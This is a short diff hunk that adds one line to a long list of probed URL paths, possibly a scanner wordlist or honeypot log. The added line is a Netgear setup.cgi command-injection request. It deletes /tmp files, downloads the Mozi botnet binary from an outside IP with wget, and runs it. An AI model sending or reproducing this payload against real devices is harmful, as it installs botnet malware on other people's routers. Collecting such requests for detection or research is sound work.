@@ -24757,3 +24757,4 @@ http://142.250.203.142/
 /.env-cd.conf
 /.env-security.conf
 /wp_gpt.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.231.104.101:37699/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
